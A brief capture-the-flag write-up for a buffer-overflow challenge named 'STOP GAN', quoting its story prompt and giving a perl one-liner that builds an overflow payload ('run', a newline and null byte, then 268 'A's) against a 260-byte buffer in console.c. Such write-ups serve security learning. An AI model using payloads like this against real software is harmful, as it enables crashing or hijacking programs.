# STOP GAN (bof) (pwn)

## Prompt

Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

## Steps

1. Look at `console.c`, buffer can hold 260 bytes
1. perl -e 'print "run"."\x0a\x00"."A"x268' > exploit.txt
